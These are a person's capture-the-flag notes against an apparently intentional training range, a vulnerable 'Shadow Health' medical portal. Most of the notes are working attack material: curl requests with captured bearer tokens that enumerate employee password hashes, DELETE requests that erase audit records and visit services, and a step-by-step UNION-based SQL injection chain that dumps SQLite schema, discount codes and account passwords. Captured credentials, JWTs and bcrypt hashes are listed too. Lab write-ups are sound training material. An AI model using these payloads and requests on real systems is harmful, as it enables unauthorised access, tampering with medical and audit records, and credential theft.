# CTF Schwab Notes


Found patient list:

```
[Patient[id=3, firstName=Charlie, lastName=Macall, birthday=2001-01-01, gender=Male, phone=3605550272], Patient[id=6, firstName=Zollie, lastName=Crighton, birthday=2004-07-30, gender=Male, phone=2065556991], Patient[id=7, firstName=Dorice, lastName=Beecheno, birthday=1944-10-28, gender=Female, phone=2065555143], Patient[id=85, firstName=Gamaliel, lastName=Annes, birthday=2010-08-28, gender=Male, phone=2065551661], Patient[id=86, firstName=Finley, lastName=Fearenside, birthday=1965-05-28, gender=Male, phone=2065553289], Patient[id=87, firstName=Desmund, lastName=Doornbos, birthday=1966-03-05, gender=Male, phone=2065559705], Patient[id=88, firstName=Calhoun, lastName=Armitt, birthday=1986-05-25, gender=Male, phone=2065557408], Patient[id=89, firstName=Meade, lastName=Bonniface, birthday=1959-02-22, gender=Female, phone=2065559205], Patient[id=90, firstName=Gardiner, lastName=Crisp, birthday=1985-06-29, gender=Male, phone=2065558359], Patient[id=91, firstName=Udell, lastName=Agastina, birthday=1957-11-05, gender=Male, phone=2065550075], Patient[id=92, firstName=Mile, lastName=Greaterex, birthday=1960-12-02, gender=Male, phone=2065551161], Patient[id=93, firstName=Regan, lastName=Setford, birthday=1956-09-23, gender=Female, phone=2065552370], Patient[id=94, firstName=Malory, lastName=Stammer, birthday=1978-09-26, gender=Female, phone=2065556294], Patient[id=95, firstName=Florance, lastName=Dyche, birthday=1989-05-17, gender=Female, phone=2065551556], Patient[id=96, firstName=Bentlee, lastName=Eversley, birthday=1959-07-18, gender=Male, phone=2065555479], Patient[id=97, firstName=Bel, lastName=Base, birthday=1972-08-21, gender=Female, phone=2065555996], Patient[id=98, firstName=Ettie, lastName=Raff, birthday=1981-02-21, gender=Female, phone=2065554821], Patient[id=99, firstName=Kippy, lastName=Caldecutt, birthday=1970-07-31, gender=Male, phone=2065558906], Patient[id=100, firstName=Katee, lastName=Faichnie, birthday=2003-12-29, gender=Female, phone=2065556606], Patient[id=101, firstName=Corine, lastName=Verey, birthday=1963-05-16, gender=Female, phone=2065559972], Patient[id=102, firstName=Ambrose, lastName=Calyton, birthday=2007-01-09, gender=Male, phone=2065559697], Patient[id=103, firstName=Rowney, lastName=Oran, birthday=1985-03-26, gender=Male, phone=2065559298], Patient[id=104, firstName=Tawsha, lastName=McAllen, birthday=1974-08-27, gender=Female, phone=2065556187], Patient[id=105, firstName=Park, lastName=Bramwich, birthday=1960-02-14, gender=Male, phone=2065557676], Patient[id=106, firstName=Sonja, lastName=Vollam, birthday=1974-05-11, gender=Female, phone=2065553474], Patient[id=107, firstName=Theressa, lastName=Pettyfer, birthday=1988-07-08, gender=Female, phone=2065552262]]
```

## Main Patient

### Creds

[andrewv ::: andrewv]

### JWT

`eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL3NoYWRvd2hlYWx0aC5jb20vaXNzdWVyIiwidXBuIjoidXNlcjIiLCJncm91cHMiOlsiUGF0aWVudCJdLCJpYXQiOjE2OTgzMzkxOTYsImV4cCI6MTY5ODQyNTU5NiwianRpIjoiYjlhYWE5NmEtZGEwNC00ODQ0LTk0M2QtYzYyYzIwMjI3ZDRlIn0.NIrxfnxgzNQdArvlIBo7xEEZb8TAJFMx5TxiIY-WZlCd-K55TdWXe0sEyXEG4iacWDl8u1SueNOsTEJkarDvH2jm-nHdds9J9RbVhoyUGy3XwPEg4QiwiJdFTWrmtGRCi5LrzauQGe3nltWietSNbguusUwfugNWKaEpMx4OtVB70j9JdqSqbK6Rug9It8RwTM0YDJo_4M781-v9PB5bIZXKyzMd5gK2AUgjUrdNwVorFedcDBga7rVZDNvBw45BD6ami8KFd0KQ6eztCPxUW_RH9_JtZq5Kr5EV8PUpiZCC-nbIQNZdX5vhMe7NkkcipUjedg3cgkPjSQR29EMquQ`

## Gerard Sekawa

Phone: 15305553475

### Creds

[gerard.sekawa ::: S3@h@wksM@rin3rsKr@k3n] seahawksmarinerskraken

### JWT

(JWT does expire - needs to be refreshed every 48 hours)

`eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL3NoYWRvd2hlYWx0aC5jb20vaXNzdWVyIiwidXBuIjoiZ2VyYXJkLnNla2F3YSIsImdyb3VwcyI6WyJEb2N0b3IiXSwiaWF0IjoxNjk4MzM4MTQwLCJleHAiOjE2OTg0MjQ1NDAsImp0aSI6IjE1ZTJmNjgzLWQzMzItNGRiOC05NjBhLTg4YzlkY2NlNmJjNiJ9.sk-cEkiE9-RlUbqZ9e-X6pcCtQ8n8Z9xB2AKQ1Fq_jYNgDzLwVOFWsnna8AoiHYj6xqYMZgRFT_tYOwfIqq_vtzeBiHrtaqyjE_IQqjiWS_RJqD1PnF_opgDiayVcsMiJcY6botdFkRZpGvJoKIUtTa9rBfbHERrNXF39fxViK1l7wyDz428KhM1UJsh_cydPDn68nvpuZRqJceMxxdzTi4FrEaLkSdEEteR5vgSnkbSz1m1DpknFjvj5gkV4xm5yvSMYzJGMaVaDMPVuYdmaw8WL63pZ2aVwujz5N0poiDHj0PkJ9uLDyBZxbvMckmcLts65vskHswHRRpwZr1sKw`

## HASHES

`curl "https://18-144-24-236-shadowhealth.vulnerablesites.net/range/shadowhealth/api/health/employees/$i" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0" -H "Accept: application/json, text/plain, */*" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL3NoYWRvd2hlYWx0aC5jb20vaXNzdWVyIiwidXBuIjoiZ2VyYXJkLnNla2F3YSIsImdyb3VwcyI6WyJEb2N0b3IiXSwiaWF0IjoxNjk4MTkxMDAzLCJleHAiOjE2OTgyNzc0MDMsImp0aSI6IjA4N2ZmOTg1LTRmZTEtNDAxOS04ODQ3LTYzMWM5OTIwNTk1ZCJ9.Wi9gLcUgZWm8ItUohIXVM9XIPrZWTLAQPaubBr91n35kRmYHMOiih24jsCwnAZsRlkPZCF8daqP0EAoiODjOIZrm5T-VNzMuM4YIazka957ZQMuzW4xt3m0MvS1KavGOdmW_WOsfTOPgTXLZNjCWhEdtFalAxd8hZ-073iZ5L7YB0jwa0kvq0syctULwpGR3VEmYQlkExzD1odJ7w4xACf8fZ5wFMTBnE-N9JIG_dQ-B7fWjVgi5I5I3dx3nBm4da2S-CzRLG-h9A4OgL9_0oVqdQ4lqkdAawTsfyDU5R4p3RlOWbwJsoaXVNFUJzA60qRoJnSbvZDdORuDcnNN0-Q"`

- [3] jordan.haig > $2a$10$G9shWvIyeHfAWLGzNEIVh.kGpvZHyvi6oANVxnDUn/QPuwql1FPn.
- [4] emily.johns > $2a$10$vyjHALllTIhoL34r4Mrzt.CKUS1KRgn97t/krVTF9uHDqQsP9Beq2
- [9] elisa.maldonado > $2a$10$byyCEnBN8/9h1jX/Ukd45OyMl1DkzhzMjBFI9oFKOLR0pDF./pEPK
- [10] brandi.simmons > $2a$10$6O.x7VwTgb1juMXVn7SUN.se7QzKfiefclgedHwz.tyhFFRzKtrUG
- [6] gerard.sekawa > $2a$10$/zt2ed7.xyx96SX8cXyzROMcOk4TJqpckkFRQw6Sv5Rr1Ps4xI3Xy
- [8] shelly.buckle > 9cae3b179d877717017105a99b0be8dad99f44b30eac40d937cbb6ff8775b231
....
- [5] alice.apple (admin) > $2a$10$/eds59431.qsbllSsZ.2o.3kmsBG5p/KshsQ/7hgn8dXO8ZhCc1R6
- [12] sophia.taylor (admin) > $2a$10$Aj2Cb2oW9WD9dZ03YdIbBuhu8jYCpL2KZ72j0tGYrytoDnO6JlTyS
- [13] evelyn.rodriguez (admin) > $2a$10$bIHqq5l99lcA52VZprpNLekkJoE4fnwFDlFHggicGwMlHZ/X4.xHW
- [14] charlotte.jones (admin) > $2a$10$P7hGYjNP8APDXEwTB2pWUOfBRi8IZhrL6RDkMZG9D.o9rUREIStmW
- [15] harper.garcia (admin) > $2a$10$jpZBGT0jRNvOxV.RHFXr8e7iRUI/wjOpyGll1n7jQ76v.2/4dMfMi
- [16] abigail.martinez (admin) > $2a$10$9jtfW8ucfwreuuJbvRTp8..IPbU9/xYqw2CuYYfZwgDgQRMIa7TwW

```
$2a$10$G9shWvIyeHfAWLGzNEIVh.kGpvZHyvi6oANVxnDUn/QPuwql1FPn.
$2a$10$vyjHALllTIhoL34r4Mrzt.CKUS1KRgn97t/krVTF9uHDqQsP9Beq2
$2a$10$byyCEnBN8/9h1jX/Ukd45OyMl1DkzhzMjBFI9oFKOLR0pDF./pEPK
$2a$10$6O.x7VwTgb1juMXVn7SUN.se7QzKfiefclgedHwz.tyhFFRzKtrUG
$2a$10$/zt2ed7.xyx96SX8cXyzROMcOk4TJqpckkFRQw6Sv5Rr1Ps4xI3Xy
$2a$10$/eds59431.qsbllSsZ.2o.3kmsBG5p/KshsQ/7hgn8dXO8ZhCc1R6
$2a$10$WderdoFusz0FoWrr.bCrkOiycCU7DKF7o3KyUBUo/Y6osb5qbrQpG
$2a$10$Aj2Cb2oW9WD9dZ03YdIbBuhu8jYCpL2KZ72j0tGYrytoDnO6JlTyS
$2a$10$bIHqq5l99lcA52VZprpNLekkJoE4fnwFDlFHggicGwMlHZ/X4.xHW
$2a$10$P7hGYjNP8APDXEwTB2pWUOfBRi8IZhrL6RDkMZG9D.o9rUREIStmW
$2a$10$jpZBGT0jRNvOxV.RHFXr8e7iRUI/wjOpyGll1n7jQ76v.2/4dMfMi
$2a$10$9jtfW8ucfwreuuJbvRTp8..IPbU9/xYqw2CuYYfZwgDgQRMIa7TwW
```

## Account Information

Patient 4 already has an associated account. 
IRENE GREEN = PATIENT 4 > CREDS = [user2 ::: pass2]

Unclaimed patients: 

Patient[id=3, firstName=Charlie, lastName=Macall, birthday=2001-01-01, gender=Male, phone=3605550272]

Patient[id=6, firstName=Zollie, lastName=Crighton, birthday=2004-07-30, gender=Male, phone=2065556991]

Patient[id=7, firstName=Dorice, lastName=Beecheno, birthday=1944-10-28, gender=Female, phone=2065555143]
Patient[id=85, firstName=Gamaliel, lastName=Annes, birthday=2010-08-28, gender=Male, phone=2065551661]

Patient[id=86, firstName=Finley, lastName=Fearenside, birthday=1965-05-28, gender=Male, phone=2065553289]

Patient[id=87, firstName=Desmund, lastName=Doornbos, birthday=1966-03-05, gender=Male, phone=2065559705]

Patient[id=88, firstName=Calhoun, lastName=Armitt, birthday=1986-05-25, gender=Male, phone=2065557408]

Patient[id=89, firstName=Meade, lastName=Bonniface, birthday=1959-02-22, gender=Female, phone=2065559205]

Patient[id=90, firstName=Gardiner, lastName=Crisp, birthday=1985-06-29, gender=Male, phone=2065558359]

Patient[id=91, firstName=Udell, lastName=Agastina, birthday=1957-11-05, gender=Male, phone=2065550075]

Patient[id=92, firstName=Mile, lastName=Greaterex, birthday=1960-12-02, gender=Male, phone=2065551161]

Patient[id=93, firstName=Regan, lastName=Setford, birthday=1956-09-23, gender=Female, phone=2065552370]

Patient[id=94, firstName=Malory, lastName=Stammer, birthday=1978-09-26, gender=Female, phone=2065556294]

Patient[id=95, firstName=Florance, lastName=Dyche, birthday=1989-05-17, gender=Female, phone=2065551556]

Patient[id=96, firstName=Bentlee, lastName=Eversley, birthday=1959-07-18, gender=Male, phone=2065555479]

Patient[id=97, firstName=Bel, lastName=Base, birthday=1972-08-21, gender=Female, phone=2065555996]

Patient[id=98, firstName=Ettie, lastName=Raff, birthday=1981-02-21, gender=Female, phone=2065554821]

Patient[id=99, firstName=Kippy, lastName=Caldecutt, birthday=1970-07-31, gender=Male, phone=2065558906]

Patient[id=100, firstName=Katee, lastName=Faichnie, birthday=2003-12-29, gender=Female, phone=2065556606]

Patient[id=101, firstName=Corine, lastName=Verey, birthday=1963-05-16, gender=Female, phone=2065559972]

Patient[id=102, firstName=Ambrose, lastName=Calyton, birthday=2007-01-09, gender=Male, phone=2065559697]

Patient[id=103, firstName=Rowney, lastName=Oran, birthday=1985-03-26, gender=Male, phone=2065559298]

Patient[id=104, firstName=Tawsha, lastName=McAllen, birthday=1974-08-27, gender=Female, phone=2065556187]

Patient[id=105, firstName=Park, lastName=Bramwich, birthday=1960-02-14, gender=Male, phone=2065557676]

Patient[id=106, firstName=Sonja, lastName=Vollam, birthday=1974-05-11, gender=Female, phone=2065553474]

Patient[id=107, firstName=Theressa, lastName=Pettyfer, birthday=1988-07-08, gender=Female, phone=2065552262]

## Delete Audit

```
curl "https://18-144-24-236-shadowhealth.vulnerablesites.net/range/shadowhealth/api/health/audits?patientId=4^%^20^%^20--" -X DELETE -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0" -H "Accept: application/json, text/plain, */*" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "Referer: https://18-144-24-236-shadowhealth.vulnerablesites.net/range/shadowhealth/portal/patient/patients/4/auditHistory" -H "Connection: keep-alive" -H "Sec-Fetch-Dest: empty" -H "Sec-Fetch-Mode: no-cors" -H "Sec-Fetch-Site: same-origin" -H "TE: trailers" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL3NoYWRvd2hlYWx0aC5jb20vaXNzdWVyIiwidXBuIjoidXNlcjIiLCJncm91cHMiOlsiUGF0aWVudCJdLCJpYXQiOjE2OTgxOTM3MzgsImV4cCI6MTY5ODI4MDEzOCwianRpIjoiMTlhNTU5OWItNDg3Yi00OTNlLTkxNTAtOTg1NmJjNjQ5ZDRkIn0.PBIji8ZFkW8VNKzmMksGx81CoPKhEqMcxZfIx7rAvZu_et1zj25rmLzizsTKHSLWddo1CVcF_HCVALgiPgWOUmnFdWMc40ftCAkApFC80Uhizk7XAkE_lAZiMkuS72NBqNFHxQF73erBVjyneucoqEfdenNvj1VYhvQPz46zkRi6SrWSi-UF6Mtb7nb8Ja4XjCw2tHUDNpJjlwMyw2zYPWwMUjRd5ngaIjTkn7QfXaivVKzMK0304PisK6t3wBRkaY4fpjXw5Un2xQM4ScmJNZHLCf179l9MBUDriGx2wCDDw9IRIfFil7E8ccF4aKcB2NqYTznUu7mWMfjn6rjk7Q" -H "Origin: https://18-144-24-236-shadowhealth.vulnerablesites.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache"
```

## Delete Service

Visit ID = 5598
Service ID = 15 & 19

```
curl "https://18-144-24-236-shadowhealth.vulnerablesites.net/range/shadowhealth/api/health/visits/5598/services/19" -X DELETE -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0" -H "Accept: application/json, text/plain, */*" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "Referer: https://18-144-24-236-shadowhealth.vulnerablesites.net/range/shadowhealth/portal/patient/patients/4/visits/5598" -H "Connection: keep-alive" -H "Sec-Fetch-Dest: empty" -H "Sec-Fetch-Mode: no-cors" -H "Sec-Fetch-Site: same-origin" -H "TE: trailers" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL3NoYWRvd2hlYWx0aC5jb20vaXNzdWVyIiwidXBuIjoidXNlcjIiLCJncm91cHMiOlsiUGF0aWVudCJdLCJpYXQiOjE2OTgxOTM3MzgsImV4cCI6MTY5ODI4MDEzOCwianRpIjoiMTlhNTU5OWItNDg3Yi00OTNlLTkxNTAtOTg1NmJjNjQ5ZDRkIn0.PBIji8ZFkW8VNKzmMksGx81CoPKhEqMcxZfIx7rAvZu_et1zj25rmLzizsTKHSLWddo1CVcF_HCVALgiPgWOUmnFdWMc40ftCAkApFC80Uhizk7XAkE_lAZiMkuS72NBqNFHxQF73erBVjyneucoqEfdenNvj1VYhvQPz46zkRi6SrWSi-UF6Mtb7nb8Ja4XjCw2tHUDNpJjlwMyw2zYPWwMUjRd5ngaIjTkn7QfXaivVKzMK0304PisK6t3wBRkaY4fpjXw5Un2xQM4ScmJNZHLCf179l9MBUDriGx2wCDDw9IRIfFil7E8ccF4aKcB2NqYTznUu7mWMfjn6rjk7Q" -H "Origin: https://18-144-24-236-shadowhealth.vulnerablesites.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache"
```

## Add Debug Insurance

{
    "5": {
        "id": 7,
        "companyName": "Debug Company",
        "code": "DEBUG",
        "contracted": false
    }
}


## Prescription Challenges

{
    "1": {
        "id": 538,
        "medicine": {
            "id": 23,
            "name": "Doxivirenz",
            "code": "SDH121",
            "description": ""
        },
        "form": "Cream",
        "quantity": 79,
        "pharmacyInfo": null,
        "doctorName": "Maxis Stewart",
        "doctorPhone": "+15305553475 ext 223"
    }
}

Write yourself a prescription > Verification Code is 0000000 (use an existing prescription type for patient)

{"id":580,"medicine":{"id":23,"name":"Doxivirenz","code":"SDH121","description":""},"form":"Cream","quantity":420,"pharmacyInfo":null,"doctorName":"Shelly Buckle","doctorPhone":"+15305553475 ext 224"}

A UNION made in heaven....the top providers and biggest discounts....
Have you tried different letter casing for the union key word? Something like UnIoN or uNIOn?

ACTUAL QUERY: `SELECT * FROM Employee WHERE title = 'Physician' AND (first_name like '%text' OR last_name like '%text')`

LISTS ALL EMPLOYEES: `') UNIOn Select * FROM Employee --`

EXPLOIT: `') AND 1=2 UNIOn Select '1a','2b',123,'4d',456,789,'7g','8h' FROM employee --`

Discovered its SQLITE

GET TABLES: `') AND 1=2 UNIOn Select 1,2,tbl_name,4,5,6,7,8 FROM sqlite_master --`

GET DISCOUNT CODES:

```
1. ') AND 1=2 UNIOn Select 1,2,tbl_name,4,5,6,7,8 FROM sqlite_master --
2. ') AND 1=2 UNIOn Select 1,2,sql,4,5,6,7,8 FROM sqlite_master WHERE name='DiscountCode' --
3. ') AND 1=2 UNIOn Select 1,2,code,4,5,6,7,8 FROM DiscountCode --

Discount Codes:
FIRST_VISIT_ON_US
SHADOW_HEALTH_20_OFF
SHADOW_HEALTH_VIP_SPECIAL_OFF

Interesting Tables:
- Access
- Account > role, username, password, salt
- Employee

1. ') AND 1=2 UNIOn Select 1,2,sql,4,5,6,7,8 FROM sqlite_master WHERE name='Account' --
2. ') AND 1=2 UNIOn Select 1,2,role || ":" || username,4,password,salt,7,8 FROM Account --
```




EOF